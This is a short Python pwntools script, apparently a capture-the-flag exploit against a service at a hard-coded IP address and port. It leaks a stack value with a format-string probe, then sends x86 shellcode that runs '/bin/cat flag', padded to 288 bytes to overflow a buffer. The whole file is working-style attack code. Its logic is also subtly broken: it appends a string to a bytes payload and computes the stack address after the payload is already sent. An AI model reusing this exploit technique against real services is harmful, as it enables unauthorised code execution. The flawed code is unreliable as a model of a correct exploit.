#!/usr/bin/python3

# -288 to top

from pwn import remote
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)

# 35 bytes
# https://masterccc.github.io/tools/shellcode_gen/ 
shell_code = b"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80"

blank = bytes([0 for i in range(288-len(shell_code))])
payld = shell_code + blank
# exit(0)

server_ip = "140.113.207.246"
target_pt = 20226

rmt = remote(server_ip, target_pt)
rmt.recvuntil('Wanna get my secret? Come and get it with your payload <3')

rmt.sendline('%38$p')

print(rmt.recv())
rbp = rmt.recv().decode().split('Wanna')[0]
payld = payld + rbp

rmt.sendline(payld)

rbp = int(rbp, 0) - 288

print(f'Stack pointer = {rbp}')

